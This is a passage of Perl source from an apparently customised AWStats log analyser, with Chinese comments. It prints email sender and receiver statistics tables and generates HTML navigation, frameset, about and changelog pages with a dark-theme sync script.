			$newkey = substr( $key, 0, $MaxLengthOfShownEMail ) . "...";
		}
		my $bredde_h = 0;
		my $bredde_k = 0;
		if ( $max_h > 0 ) {
			$bredde_h = int( $BarWidth * $_emails_h{$key} / $max_h ) + 1;
		}
		if ( $max_k > 0 ) {
			$bredde_k = int( $BarWidth * $_emails_k{$key} / $max_k ) + 1;
		}
		print "<tr>";
		my $direction = IsLocalEMail($key);

		if ( $direction > 0 ) {
			print "<td class=\"aws\">$newkey</td><td>-&gt;</td><td>&nbsp;</td>";
		}
		if ( $direction == 0 ) {
			print
"<td colspan=\"3\"><span style=\"color: #$color_other\">$newkey</span></td>";
		}
		if ( $direction < 0 ) {
			print "<td class=\"aws\">&nbsp;</td><td>&lt;-</td><td>$newkey</td>";
		}
		if ( $ShowEMailSenders =~ /H/i ) { print "<td>$_emails_h{$key}</td>"; }
		if ( $ShowEMailSenders =~ /B/i ) {
			print "<td nowrap=\"nowrap\">"
			  . Format_Bytes( $_emails_k{$key} ) . "</td>";
		}
		if ( $ShowEMailSenders =~ /M/i ) {
			print "<td nowrap=\"nowrap\">"
			  . Format_Bytes( $_emails_k{$key} / ( $_emails_h{$key} || 1 ) )
			  . "</td>";
		}
		if ( $ShowEMailSenders =~ /L/i ) {
			print "<td nowrap=\"nowrap\">"
			  . ( $_emails_l{$key} ? Format_Date( $_emails_l{$key}, 1 ) : '-' )
			  . "</td>";
		}
		print "</tr>\n";

		#$total_p += $_emails_p{$key};
		$total_h += $_emails_h{$key};
		$total_k += $_emails_k{$key};
		$count++;
	}
	$rest_p = 0;                        # $rest_p=$TotalPages-$total_p;
	$rest_h = $TotalHits - $total_h;
	$rest_k = $TotalBytes - $total_k;
	if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 ) { # All other sender emails
		print
"<tr><td colspan=\"3\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		if ( $ShowEMailSenders =~ /H/i ) { print "<td>$rest_h</td>"; }
		if ( $ShowEMailSenders =~ /B/i ) {
			print "<td nowrap=\"nowrap\">" . Format_Bytes($rest_k) . "</td>";
		}
		if ( $ShowEMailSenders =~ /M/i ) {
			print "<td nowrap=\"nowrap\">"
			  . Format_Bytes( $rest_k / ( $rest_h || 1 ) ) . "</td>";
		}
		if ( $ShowEMailSenders =~ /L/i ) { print "<td>&nbsp;</td>"; }
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints HTML to display an email receivers chart
# Parameters:   -
# Input:        $NewLinkParams, NewLinkTarget
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowEmailReceiversChart {
	my $NewLinkParams         = shift;
	my $NewLinkTarget         = shift;
	my $MaxLengthOfShownEMail = 48;

	my $total_p;
	my $total_h;
	my $total_k;
	my $max_p;
	my $max_h;
	my $max_k;
	my $rest_p;
	my $rest_h;
	my $rest_k;

	# Show filter form
	#&ShowFormFilter("emailrfilter",$EmailrFilter);
	# Show emails list

	print "$Center<a name=\"emailreceivers\">&nbsp;</a><br />\n";
	my $title;
	if ( $HTMLOutput{'allemailr'} || $HTMLOutput{'lastemailr'} ) {
		$title = _t("Email Receivers");
	}
	else {
		$title = _t("Email Receivers") . " (" . _t("Top") . " $MaxNbOf{'EMailsShown'}) &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'}
			  || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=allemailr")
			: "$StaticLinks.allemailr.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
		if ( $ShowEMailReceivers =~ /L/i ) {
			$title .= " &nbsp; - &nbsp; <a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'}
				  || !$StaticLinks
				? XMLEncode("$AWScript${NewLinkParams}output=lastemailr")
				: "$StaticLinks.lastemailr.$StaticExt"
			  )
			  . "\"$NewLinkTarget>" . _t("Last") . "</a>";
		}
	}
	&tab_head( "$title", 19, 0, 'emailreceivers' );
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"3\">" . _t("Email Receivers") . " : "
	  . ( scalar keys %_emailr_h ) . "</th>";
	if ( $ShowEMailReceivers =~ /H/i ) {
		print "<th rowspan=\"2\" bgcolor=\"#$color_h\" width=\"80\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</th>";
	}
	if ( $ShowEMailReceivers =~ /B/i ) {
		print
"<th class=\"datasize\" rowspan=\"2\" bgcolor=\"#$color_k\" width=\"80\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</th>";
	}
	if ( $ShowEMailReceivers =~ /M/i ) {
		print
"<th rowspan=\"2\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Average") . "</th>";
	}
	if ( $ShowEMailReceivers =~ /L/i ) {
		print "<th rowspan=\"2\" width=\"120\">" . _t("Last") . "</th>";
	}
	print "</tr>\n";
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"30%\">Local</th><th>&nbsp;</th><th width=\"30%\">External</th></tr>";
	$total_p = $total_h = $total_k = 0;
	$max_h = 1;
	foreach ( values %_emailr_h ) {
		if ( $_ > $max_h ) { $max_h = $_; }
	}
	$max_k = 1;
	foreach ( values %_emailr_k ) {
		if ( $_ > $max_k ) { $max_k = $_; }
	}
	my $count = 0;
	if ( !$HTMLOutput{'allemailr'} && !$HTMLOutput{'lastemailr'} ) {
		&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emailr_h,
			\%_emailr_h );
	}
	if ( $HTMLOutput{'allemailr'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emailr_h,
			\%_emailr_h );
	}
	if ( $HTMLOutput{'lastemailr'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emailr_h,
			\%_emailr_l );
	}
	foreach my $key (@keylist) {
		my $newkey = $key;
		if ( length($key) > $MaxLengthOfShownEMail ) {
			$newkey = substr( $key, 0, $MaxLengthOfShownEMail ) . "...";
		}
		my $bredde_h = 0;
		my $bredde_k = 0;
		if ( $max_h > 0 ) {
			$bredde_h = int( $BarWidth * $_emailr_h{$key} / $max_h ) + 1;
		}
		if ( $max_k > 0 ) {
			$bredde_k = int( $BarWidth * $_emailr_k{$key} / $max_k ) + 1;
		}
		print "<tr>";
		my $direction = IsLocalEMail($key);

		if ( $direction > 0 ) {
			print "<td class=\"aws\">$newkey</td><td>&lt;-</td><td>&nbsp;</td>";
		}
		if ( $direction == 0 ) {
			print
"<td colspan=\"3\"><span style=\"color: #$color_other\">$newkey</span></td>";
		}
		if ( $direction < 0 ) {
			print "<td class=\"aws\">&nbsp;</td><td>-&gt;</td><td>$newkey</td>";
		}
		if ( $ShowEMailReceivers =~ /H/i ) {
			print "<td>$_emailr_h{$key}</td>";
		}
		if ( $ShowEMailReceivers =~ /B/i ) {
			print "<td nowrap=\"nowrap\">"
			  . Format_Bytes( $_emailr_k{$key} ) . "</td>";
		}
		if ( $ShowEMailReceivers =~ /M/i ) {
			print "<td nowrap=\"nowrap\">"
			  . Format_Bytes( $_emailr_k{$key} / ( $_emailr_h{$key} || 1 ) )
			  . "</td>";
		}
		if ( $ShowEMailReceivers =~ /L/i ) {
			print "<td nowrap=\"nowrap\">"
			  . ( $_emailr_l{$key} ? Format_Date( $_emailr_l{$key}, 1 ) : '-' )
			  . "</td>";
		}
		print "</tr>\n";

		#$total_p += $_emailr_p{$key};
		$total_h += $_emailr_h{$key};
		$total_k += $_emailr_k{$key};
		$count++;
	}
	$rest_p = 0;                        # $rest_p=$TotalPages-$total_p;
	$rest_h = $TotalHits - $total_h;
	$rest_k = $TotalBytes - $total_k;
	if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )
	{                                   # All other receiver emails
		print
"<tr><td colspan=\"3\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		if ( $ShowEMailReceivers =~ /H/i ) { print "<td>$rest_h</td>"; }
		if ( $ShowEMailReceivers =~ /B/i ) {
			print "<td nowrap=\"nowrap\">" . Format_Bytes($rest_k) . "</td>";
		}
		if ( $ShowEMailReceivers =~ /M/i ) {
			print "<td nowrap=\"nowrap\">"
			  . Format_Bytes( $rest_k / ( $rest_h || 1 ) ) . "</td>";
		}
		if ( $ShowEMailReceivers =~ /L/i ) { print "<td>&nbsp;</td>"; }
		print "</tr>\n";
	}
	&tab_end();
}

#=============================================================================
# Function:    返回主题切换的JavaScript代码
# Description: 生成用于主题管理的JavaScript脚本，实现以下功能：
#              - 从 localStorage 读取保存的主题并应用
#              - 监听其他页面的主题变化（storage事件）并同步
#              - 监听 iframe 消息（postMessage）并同步
#              - 自动向 nav 和 stats 框架广播主题变化
# 
# Return:      HTML script 标签包裹的JavaScript代码
# Notes:       此脚本会被所有文档页面引入，确保整个应用主题统一
#=============================================================================
sub get_theme_script {
    return <<'END_SCRIPT';
<script>
(function() {
	const savedTheme = localStorage.getItem('awstats-theme');
	if (savedTheme === 'dark') {
		document.documentElement.setAttribute('data-theme', 'dark');
	}
	
	window.addEventListener('storage', function(e) {
		if (e.key === 'awstats-theme') {
			document.documentElement.setAttribute('data-theme', e.newValue);
			const navFrame = document.getElementsByName('nav')[0];
			const statsFrame = document.getElementsByName('stats')[0];
			if (navFrame && navFrame.contentWindow) {
				navFrame.contentWindow.postMessage({ theme: e.newValue }, '*');
			}
			if (statsFrame && statsFrame.contentWindow) {
				statsFrame.contentWindow.postMessage({ theme: e.newValue }, '*');
			}
		}
	});
	
	window.addEventListener('message', function(e) {
		if (e.data && e.data.theme) {
			document.documentElement.setAttribute('data-theme', e.data.theme);
		}
	});
})();
</script>
END_SCRIPT
}

#------------------------------------------------------------------------------
# 生成导航页面（简洁版，利用语言文件格式化）
# Parameters:   $dir (统计目录), $current_month (当前月份), $months_ref (月份列表引用)
# Return:       None
#------------------------------------------------------------------------------
sub generate_nav_page {
    my ($dir, $current_month, $months_ref) = @_;
    
    # 获取月份列表
    my @months = @$months_ref;
    if (!@months) {
        opendir(my $dh, $dir) or return;
        @months = grep { -d "$dir/$_" && /^\d{4}-\d{2}$/ } readdir($dh);
        closedir $dh;
        @months = sort { $b cmp $a } @months;
    }
    # 构建月份选项
    my $select_options = '';
    foreach my $link (@months) {
        next if $link eq 'icon';
        my ($year, $mon) = split('-', $link);
        my $month_name = _t("month_$mon");
        
        # 方法1：使用 sprintf
        my $format = _t("date_format_month");
        my $display = sprintf($format, $month_name, $year);

        my $selected = ($link eq $current_month) ? ' selected' : '';
        $select_options .= "<option value=\"$link\"$selected>$display</option>\n";
    }
	my $theme_script = get_theme_script();
	my $lang = $Lang || 'en';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    my $title = _t("AWStats Log Viewer");
    # 生成 HTML
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
<title>$title</title>
<style>
:root{--bg-color:#ffffff;--text-color:#1f2937;--border-color:#e5e7eb;--card-bg:#ffffff}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--border-color:#374151;--card-bg:#2d3748}body{margin:0;padding:10px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background-color:var(--bg-color);color:var(--text-color);transition:background-color 0.3s,color 0.2s}table{width:auto;border-collapse:collapse}img{max-width:120px;height:auto;display:block}select{width:auto;padding:8px 12px;border:1px solid var(--border-color);border-radius:6px;background-color:var(--card-bg);color:var(--text-color);font-size:14px;cursor:pointer}select:hover{border-color:var(--primary-color,#2563eb)}td{padding:2px 5px;white-space:nowrap}
</style>
</head>
<body>
<table>
<tr>
<td>
<form name="period">
<select name="select" onchange="changeMonth()">
$select_options
</select>
</form>
</td>
</tr>
</table>
	$theme_script
</body>
</html>
END_HTML
    
    # 写入文件
    open(my $fh, '>:encoding(UTF-8)', "$dir/nav.html") or return;
    print $fh $html;
    close $fh;
}

#------------------------------------------------------------------------------
# 生成框架页面 index.html（上下布局）
# Parameters:   $dir (统计目录), $current_month (当前月份)
# Return:       None
#------------------------------------------------------------------------------
sub generate_index_page {
    my ($dir, $current_month) = @_;
    
    # 获取翻译文本
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
    my $browser_support = _t("Your browser does not support frames. Please use a modern browser.");
    my $view_stats = _t("View statistics directly");
    my $meta_description = _t("meta.description");
    my $meta_keywords = _t("meta.keywords");
    my $meta_author = _t("meta.author");
    my $og_title = _t("og.title");
    my $og_description = _t("og.description");
    my $og_image_alt = _t("og.image.alt");
	my $chart_emoji = "📊";
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <title>$page_title</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="$meta_description">
    <meta name="keywords" content="$meta_keywords">
    <meta name="author" content="$meta_author">
    <meta property="og:title" content="$og_title">
    <meta property="og:description" content="$og_description">
    <meta property="og:type" content="website">
    <meta property="og:image" content="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='80' font-size='80'%3E$chart_emoji%3C/text%3E%3C/svg%3E">
    <meta property="og:image:alt" content="$og_image_alt">
    <meta property="og:locale" content="$lang">
	<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='80' font-size='80'%3E📊%3C/text%3E%3C/svg%3E">
	<link rel="icon" type="image/svg+xml" sizes="16x16" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='80' font-size='80'%3E📊%3C/text%3E%3C/svg%3E">
	<link rel="apple-touch-icon" sizes="180x180" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='80' font-size='80'%3E📊%3C/text%3E%3C/svg%3E">
	<link rel="icon" sizes="192x192" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='80' font-size='80'%3E📊%3C/text%3E%3C/svg%3E">
	<link rel="icon" sizes="512x512" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='80' font-size='80'%3E📊%3C/text%3E%3C/svg%3E">    
	<style>
	body{margin:0;padding:0;font-family:system-ui,-apple-system,sans-serif;background-color:var(--bg-color);color:var(--text-color)}.no-frames{padding:20px;text-align:center}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa}
    </style>
	$theme_script
</head>
<frameset rows="60,*" border="0" frameborder="0" framespacing="0">
    <frame src="nav.html" name="nav" noresize="noresize" scrolling="no" frameborder="0">
    <frame src="$current_month/index.html" name="stats" noresize="noresize" scrolling="auto" frameborder="0">
</frameset>
<noframes>
    <body>
        <div class="no-frames">
            <p>$browser_support</p>
            <p><a href="$current_month/index.html">$view_stats</a></p>
        </div>
    </body>
</noframes>
</html>
END_HTML
    
    open(my $fh, '>:encoding(UTF-8)', "$dir/index.html") or return;
    print $fh $html;
    close $fh;
    generate_what_doc($dir);
    print "DEBUG: Generated index.html in $dir with language $lang\n" if $Debug;
}
#------------------------------------------------------------------------------
# 生成 what 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_what_doc {
    my ($dir) = @_;
    
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = _t("sponsor.section");
	my $theme_script = get_theme_script();
	my $full_title = _t("docs.what.title") . " - " . "$page_title";
    my $doc_title = _t("docs.what.title");
    my $doc_intro = _t("docs.what.intro");
    my $doc_history = _t("docs.what.history");
    my $features_title = _t("docs.what.features.title");
    my $features_list = _t("docs.what.features.list");
    my $requirements_title = _t("docs.what.requirements.title");
    my $requirements_list = _t("docs.what.requirements.list");
    my $compare_link = _t("docs.what.compare.link");
    my $doc_dir = "$dir/docs"; 
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$full_title</title>
	<style>
	body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1000px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color)}.doc-nav a{margin-right:20px}.feature-list{columns:2;column-gap:40px}:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    
    $doc_intro
    
    $doc_history
    
    <h2>$features_title</h2>
    <div class="feature-list">
        $features_list
    </div>
    
    <h2>$requirements_title</h2>
    $requirements_list
    
    <p><a href="awstats_compare.html">🔍 $compare_link</a></p>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
	$theme_script
</body>
</html>
END_HTML

    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_what.html") or return;
    print $fh $html;
    close $fh;

	print "DEBUG: Generated awstats_what.html in $doc_dir with language $lang\n" if $Debug;

}
#------------------------------------------------------------------------------
# 生成 changelog 文档页面 (修正版)
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_changelog_doc {
    my ($dir) = @_;
    
    # 获取所有翻译文本 - 用 my 定义变量
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
    my $full_title = _t("docs.changelog.title") . " - " . "$page_title";
    my $doc_title = _t("docs.changelog.title");
    my $subtitle = _t("docs.changelog.subtitle");
    my $warning = _t("docs.changelog.warning");
    my $SPONSOR_SECTION = _t("sponsor.section");
    # 8.x 系列
    my $changelog_8_1_date = _t("changelog.8.1.date");
    my $changelog_8_1_version = _t("changelog.8.1.version");
    my $changelog_8_1_items = _t("changelog.8.1.items");
    
    my $changelog_8_0_date = _t("changelog.8.0.date");
    my $changelog_8_0_version = _t("changelog.8.0.version");
    my $changelog_8_0_items = _t("changelog.8.0.items");
    
    # 7.x 系列
    my $changelog_7_9_date = _t("changelog.7.9.date");
    my $changelog_7_9_version = _t("changelog.7.9.version");
    my $changelog_7_9_items = _t("changelog.7.9.items");
    
    my $changelog_7_8_date = _t("changelog.7.8.date");
    my $changelog_7_8_version = _t("changelog.7.8.version");
    my $changelog_7_8_items = _t("changelog.7.8.items");
    
    my $changelog_7_7_date = _t("changelog.7.7.date");
    my $changelog_7_7_version = _t("changelog.7.7.version");
    my $changelog_7_7_items = _t("changelog.7.7.items");
    
    my $changelog_7_6_date = _t("changelog.7.6.date");
    my $changelog_7_6_version = _t("changelog.7.6.version");
    my $changelog_7_6_items = _t("changelog.7.6.items");
    
    my $changelog_7_5_date = _t("changelog.7.5.date");
    my $changelog_7_5_version = _t("changelog.7.5.version");
    my $changelog_7_5_items = _t("changelog.7.5.items");
    
    my $changelog_7_4_date = _t("changelog.7.4.date");
    my $changelog_7_4_version = _t("changelog.7.4.version");
    my $changelog_7_4_items = _t("changelog.7.4.items");
    
    my $changelog_7_3_date = _t("changelog.7.3.date");
    my $changelog_7_3_version = _t("changelog.7.3.version");
    my $changelog_7_3_items = _t("changelog.7.3.items");
    
    my $changelog_7_2_date = _t("changelog.7.2.date");
    my $changelog_7_2_version = _t("changelog.7.2.version");
    my $changelog_7_2_items = _t("changelog.7.2.items");
    
    my $changelog_7_1_1_date = _t("changelog.7.1.1.date");
    my $changelog_7_1_1_version = _t("changelog.7.1.1.version");
    my $changelog_7_1_1_items = _t("changelog.7.1.1.items");
    
    my $changelog_7_1_date = _t("changelog.7.1.date");
    my $changelog_7_1_version = _t("changelog.7.1.version");
    my $changelog_7_1_items = _t("changelog.7.1.items");
    
    my $changelog_7_0_date = _t("changelog.7.0.date");
    my $changelog_7_0_version = _t("changelog.7.0.version");
    my $changelog_7_0_items = _t("changelog.7.0.items");
    
    # 6.x 系列
    my $changelog_6_95_date = _t("changelog.6.95.date");
    my $changelog_6_95_version = _t("changelog.6.95.version");
    my $changelog_6_95_items = _t("changelog.6.95.items");
    
    my $changelog_6_9_date = _t("changelog.6.9.date");
    my $changelog_6_9_version = _t("changelog.6.9.version");
    my $changelog_6_9_items = _t("changelog.6.9.items");
    
    my $changelog_6_8_date = _t("changelog.6.8.date");
    my $changelog_6_8_version = _t("changelog.6.8.version");
    my $changelog_6_8_items = _t("changelog.6.8.items");
    
    my $changelog_6_7_date = _t("changelog.6.7.date");
    my $changelog_6_7_version = _t("changelog.6.7.version");
    my $changelog_6_7_items = _t("changelog.6.7.items");
    
    my $changelog_6_6_date = _t("changelog.6.6.date");
    my $changelog_6_6_version = _t("changelog.6.6.version");
    my $changelog_6_6_items = _t("changelog.6.6.items");
    
    my $changelog_6_5_date = _t("changelog.6.5.date");
    my $changelog_6_5_version = _t("changelog.6.5.version");
    my $changelog_6_5_items = _t("changelog.6.5.items");
    
    my $changelog_6_4_date = _t("changelog.6.4.date");
    my $changelog_6_4_version = _t("changelog.6.4.version");
    my $changelog_6_4_items = _t("changelog.6.4.items");
    
    my $changelog_6_3_date = _t("changelog.6.3.date");
    my $changelog_6_3_version = _t("changelog.6.3.version");
    my $changelog_6_3_items = _t("changelog.6.3.items");
    
    my $changelog_6_2_date = _t("changelog.6.2.date");
    my $changelog_6_2_version = _t("changelog.6.2.version");
    my $changelog_6_2_items = _t("changelog.6.2.items");
    
    my $changelog_6_1_date = _t("changelog.6.1.date");
    my $changelog_6_1_version = _t("changelog.6.1.version");
    my $changelog_6_1_items = _t("changelog.6.1.items");
    
    my $changelog_6_0_date = _t("changelog.6.0.date");
    my $changelog_6_0_version = _t("changelog.6.0.version");
    my $changelog_6_0_items = _t("changelog.6.0.items");
    
    # 5.x 系列
    my $changelog_5_9_date = _t("changelog.5.9.date");
    my $changelog_5_9_version = _t("changelog.5.9.version");
    my $changelog_5_9_items = _t("changelog.5.9.items");
    
    my $changelog_5_8_date = _t("changelog.5.8.date");
    my $changelog_5_8_version = _t("changelog.5.8.version");
    my $changelog_5_8_items = _t("changelog.5.8.items");
    
    my $changelog_5_7_date = _t("changelog.5.7.date");
    my $changelog_5_7_version = _t("changelog.5.7.version");
    my $changelog_5_7_items = _t("changelog.5.7.items");
    
    my $changelog_5_6_date = _t("changelog.5.6.date");
    my $changelog_5_6_version = _t("changelog.5.6.version");
    my $changelog_5_6_items = _t("changelog.5.6.items");
    
    my $changelog_5_5_date = _t("changelog.5.5.date");
    my $changelog_5_5_version = _t("changelog.5.5.version");
    my $changelog_5_5_items = _t("changelog.5.5.items");
    
    my $changelog_5_4_date = _t("changelog.5.4.date");
    my $changelog_5_4_version = _t("changelog.5.4.version");
    my $changelog_5_4_items = _t("changelog.5.4.items");
    
    my $changelog_5_3_date = _t("changelog.5.3.date");
    my $changelog_5_3_version = _t("changelog.5.3.version");
    my $changelog_5_3_items = _t("changelog.5.3.items");
    
    my $changelog_5_2_date = _t("changelog.5.2.date");
    my $changelog_5_2_version = _t("changelog.5.2.version");
    my $changelog_5_2_items = _t("changelog.5.2.items");
    
    my $changelog_5_1_date = _t("changelog.5.1.date");
    my $changelog_5_1_version = _t("changelog.5.1.version");
    my $changelog_5_1_items = _t("changelog.5.1.items");
    
    my $changelog_5_0_date = _t("changelog.5.0.date");
    my $changelog_5_0_version = _t("changelog.5.0.version");
    my $changelog_5_0_items = _t("changelog.5.0.items");
    
    # 4.x 系列
    my $changelog_4_1_date = _t("changelog.4.1.date");
    my $changelog_4_1_version = _t("changelog.4.1.version");
    my $changelog_4_1_items = _t("changelog.4.1.items");
    
    my $changelog_4_0_date = _t("changelog.4.0.date");
    my $changelog_4_0_version = _t("changelog.4.0.version");
    my $changelog_4_0_items = _t("changelog.4.0.items");
    
    # 3.x 系列
    my $changelog_3_2_date = _t("changelog.3.2.date");
    my $changelog_3_2_version = _t("changelog.3.2.version");
    my $changelog_3_2_items = _t("changelog.3.2.items");
    
    my $changelog_3_1_date = _t("changelog.3.1.date");
    my $changelog_3_1_version = _t("changelog.3.1.version");
    my $changelog_3_1_items = _t("changelog.3.1.items");
    
    my $changelog_3_0_date = _t("changelog.3.0.date");
    my $changelog_3_0_version = _t("changelog.3.0.version");
    my $changelog_3_0_items = _t("changelog.3.0.items");
    
    # 2.x 系列
    my $changelog_2_24_date = _t("changelog.2.24.date");
    my $changelog_2_24_version = _t("changelog.2.24.version");
    my $changelog_2_24_items = _t("changelog.2.24.items");
    
    my $changelog_2_23_date = _t("changelog.2.23.date");
    my $changelog_2_23_version = _t("changelog.2.23.version");
    my $changelog_2_23_items = _t("changelog.2.23.items");
    
    my $changelog_2_1_date = _t("changelog.2.1.date");
    my $changelog_2_1_version = _t("changelog.2.1.version");
    my $changelog_2_1_items = _t("changelog.2.1.items");
    
    # 1.x 系列
    my $changelog_1_0_date = _t("changelog.1.0.date");
    my $changelog_1_0_version = _t("changelog.1.0.version");
    my $changelog_1_0_items = _t("changelog.1.0.items");
    
    # 早期开发阶段
    my $early_items = _t("changelog.early.1999.items");
	my $series_8_title = _t("series.8.title");
	my $series_7_title = _t("series.7.title");
	my $series_6_title = _t("series.6.title");
	my $series_5_title = _t("series.5.title");
	my $series_4_title = _t("series.4.title");
	my $series_3_title = _t("series.3.title");
	my $series_2_title = _t("series.2.title");
	my $series_1_title = _t("series.1.title");
	my $series_early_title = _t("series.early.title");
	my $footer_note = _t("footer.note");
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--surface-secondary:#f9fafb;--timeline-color:#3b82f6;--warning-bg:#fff3cd;--warning-border:#ffeeba;--warning-color:#856404;--series-8:#8b5cf6;--series-7:#10b981;--series-6:#f59e0b;--series-5:#ef4444;--series-4:#6366f1;--series-3:#ec4899;--series-2:#14b8a6;--series-1:#f97316;--series-early:#6b7280}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--surface-secondary:#1f2937;--timeline-color:#60a5fa;--warning-bg:#332e1c;--warning-border:#665c2c;--warning-color:#ffd966;--series-8:#a78bfa;--series-7:#34d399;--series-6:#fbbf24;--series-5:#f87171;--series-4:#818cf8;--series-3:#f472b6;--series-2:#2dd4bf;--series-1:#fb923c;--series-early:#9ca3af}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1000px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}h1{color:var(--text-color);border-bottom:2px solid var(--timeline-color);padding-bottom:10px;font-size:2em}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:20px;font-size:1.1em}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px}.doc-nav a:hover{background-color:var(--border-color)}.warning{background-color:var(--warning-bg);border:1px solid var(--warning-border);color:var(--warning-color);padding:15px;border-radius:8px;margin:20px 0;font-weight:500;font-size:1.1em}.timeline{position:relative;padding:20px 0}.timeline::before{content:'';position:absolute;left:180px;top:0;bottom:0;width:2px;background:var(--timeline-color);opacity:0.3}.series-header{margin:40px 0 20px 180px;font-size:1.5em;font-weight:700;padding-bottom:8px;border-bottom:2px solid}.series-8{border-color:var(--series-8);color:var(--series-8)}.series-7{border-color:var(--series-7);color:var(--series-7)}.series-6{border-color:var(--series-6);color:var(--series-6)}.series-5{border-color:var(--series-5);color:var(--series-5)}.series-4{border-color:var(--series-4);color:var(--series-4)}.series-3{border-color:var(--series-3);color:var(--series-3)}.series-2{border-color:var(--series-2);color:var(--series-2)}.series-1{border-color:var(--series-1);color:var(--series-1)}.series-early{border-color:var(--series-early);color:var(--series-early)}.version-item{position:relative;margin-bottom:30px;padding-left:200px}.version-date{position:absolute;left:0;width:160px;font-weight:600;color:var(--timeline-color);text-align:right;font-size:1.1em;padding-right:20px}.version-marker{position:absolute;left:174px;width:12px;height:12px;border-radius:50%;background:var(--timeline-color);border:2px solid var(--bg-color);box-shadow:0 0 0 2px var(--timeline-color);z-index:2}.version-content{background:var(--header-bg);border:1px solid var(--border-color);border-radius:12px;padding:20px;transition:transform 